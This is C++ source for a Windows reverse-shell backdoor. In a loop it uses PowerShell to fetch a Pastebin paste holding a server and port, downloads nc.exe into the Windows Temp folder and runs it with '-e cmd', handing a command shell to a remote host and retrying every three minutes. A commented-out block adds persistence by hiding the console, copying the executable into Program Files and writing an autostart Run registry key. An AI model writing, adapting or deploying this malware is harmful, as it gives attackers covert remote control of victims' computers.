#include <iostream>
#include <regv.h>
#include <windows.h>
#include <dirent.h>
#include "include/behaviour.h"

using namespace std;

int main(void){
// --------------------------------------------------------------------------------------------
/* Uncomment to enable persistent mode

    // Hide windows console
    //ShowWindow(GetConsoleWindow(),SW_HIDE);
    //Get current location
    char* cwd = _getcwd( 0, 0 );
    string directory (cwd);
    free(cwd);
    replace( directory.begin(), directory.end(), '\\', '/');
    //Filename of your executable
    cout << directory << endl;
    string directory_file = (directory+"/main.exe");
    cout << directory_file << endl;
    //Copy your executable to "C:/Program Files/Windows NT/main.exe" for autostart on boot
    CopyFile(directory_file.c_str(), "C:/Program Files/Windows NT/main.exe", FALSE);
    //Write on reg for program autostart
    RegWrite(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "main",REG_SZ, "C:/Program Files/Windows NT/main.exe");

*/// Uncomment to enable persistent mode


    while (true){
// --------------------------------------------------------------------------------------------
        // Raw of pastebin with server and port
        string url = "https://pastebin.com/raw/T8t1hVC6";
        //Location where txt file will be downloaded
        string path = "C:/Windows/Temp/text.txt";
        //Command powershell v2
        string cmd = ("powershell (New-Object Net.WebClient).DownloadFile( '"+url+"', '"+path+"')");
        system(cmd.c_str());

// --------------------------------------------------------------------------------------------
        //Oppening file downloaded
        ifstream txt(path);
        //string who will get content of file
        string line_one;
        string line_two;
        //getting content from file
        getline(txt, line_one);
        getline(txt, line_two);

// --------------------------------------------------------------------------------------------
        //Array for split the text
        std::vector<std::string> ServnPort;
        //splitting the text where had '|'
        ServnPort=split(line_one,"|");
        //String for server
        string server = ServnPort[0];
        //String for port
        string port = ServnPort[1];
        //comand to give cmd to ngrok server, and port
        string cmd_two = ("C:/Windows/Temp/nc.exe -e cmd "+server+" "+port);
        string cmd_one = ("powershell (New-Object Net.WebClient).DownloadFile( '"+line_two+"', 'C:/Windows/Temp/nc.exe')");
        system(cmd_one.c_str());
        system(cmd_two.c_str());

        //Try re-connection every 3 minutes
        Sleep(180000);
    }
// --------------------------------------------------------------------------------------------
}
